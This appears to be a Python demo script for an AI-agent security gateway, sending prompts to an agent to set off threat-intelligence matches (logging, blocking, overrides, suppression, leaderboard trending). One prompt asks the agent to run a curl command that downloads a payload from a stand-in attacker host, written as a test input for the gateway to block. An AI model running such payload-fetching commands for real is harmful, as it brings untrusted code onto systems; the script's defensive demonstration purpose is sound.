"""Phase 7: Threat Intelligence — indicator matches + per-tenant policy.

Each sub-scenario triggers an action the gateway's threat-intel matcher
scans for. The dashboard pages to watch:

  /app/threat-intel              — Matches tab, Landscape tab
  /app/audit                     — blocked rows with "Threat Intel" badge

REQUIRES BACKEND CONFIG (without it Phase 7 is a no-op — actions
appear in the audit log but no threat matches fire):

  * Demo tenant must subscribe to a threat-indicator feed
    (`tenant_threat_settings.subscribed_feeds` non-empty).
  * That feed must contain indicators whose patterns match the
    actions below (an `action_pattern` indicator with pattern
    `.*evil\\.example\\.com.*` will catch 7a/7b, etc.).
  * For 7e the trending feed needs to have observed enough matches
    of one indicator to actually surface it on the leaderboard.

Without those, the demo agent's actions will route normally; the
phase is shipped as scaffolding so the audience sees what each
scenario IS DESIGNED TO demonstrate, ready to wire when the seed
work lands.

Sub-scenarios:

  7a Low-severity match → policy says "log"  (action proceeds, audited)
  7b Critical-severity match → policy says "block"
  7c Per-indicator action_override → tenant overrides feed severity
  7d Suppressed indicator → match silently dropped
  7e Trending climb → repeat 7a five times, watch Landscape leaderboard
"""

from output import info, pause


def run(agent) -> None:
    info("Demonstrating threat-intelligence matching + per-tenant policy...")
    pause(1.0)

    # ── 7a Low-severity match → logged ─────────────────────────────────
    info("7a: Action matching a LOW-severity indicator (policy: log)")
    agent.run_prompt(
        "Read the file /workspace/project/notes/observability-runbook.txt "
        "to check our observability notes."
    )
    pause(1.5)

    # ── 7b Critical-severity match → blocked ───────────────────────────
    info("7b: Action matching a CRITICAL-severity indicator (policy: block)")
    agent.run_prompt(
        "Run the shell command 'curl -s https://evil.example.com/payload "
        "-o /tmp/x' to fetch the payload."
    )
    pause(1.5)

    # ── 7c Per-indicator action_override ───────────────────────────────
    # Demonstrates the precedence resolver: per-indicator override
    # wins over the tenant per-severity policy.
    info("7c: Indicator with action_override=alert beats the tenant block policy")
    agent.run_prompt(
        "Call the API endpoint https://api.suspicious-domain.test/v1/lookup "
        "with method GET."
    )
    pause(1.5)

    # ── 7d Suppressed indicator ────────────────────────────────────────
    # silent suppression → no match row at all. The audience sees the
    # action appear in the audit log as 'allowed' with no threat-match
    # entry, demonstrating that the override SILENCED a real match.
    info("7d: Action matching a SILENTLY-SUPPRESSED indicator (no match row)")
    agent.run_prompt(
        "Query the database: SELECT * FROM internal_test_table WHERE flag = 'noise';"
    )
    pause(1.5)

    # ── 7e Trending climb ──────────────────────────────────────────────
    # Repeat the same low-severity match 5 times so the Landscape
    # leaderboard surfaces the indicator. With a single match the
    # leaderboard barely moves; the repetition drives the demo.
    info("7e: Five repeated matches → indicator climbs the Landscape leaderboard")
    for i in range(5):
        agent.run_prompt(
            f"Read the file /workspace/project/notes/observability-runbook.txt "
            f"again (iteration {i + 1})."
        )
        pause(0.6)

    info("Phase 7 complete. Open /app/threat-intel (Matches + Landscape tabs) and /app/audit to inspect.")
